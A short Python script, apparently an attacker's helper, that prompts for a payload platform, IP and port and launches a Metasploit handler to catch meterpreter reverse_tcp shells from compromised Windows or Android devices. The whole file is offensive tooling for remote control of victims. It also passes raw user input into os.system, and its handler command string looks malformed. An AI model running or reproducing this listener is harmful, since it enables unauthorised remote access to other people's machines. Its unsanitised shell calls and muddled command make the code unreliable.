import os
payload = input("Payload type to listen hem windows android ? ")
os.system("ifconfig")
ip = input("your ip ? ")
port = input("your port ? ")
os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
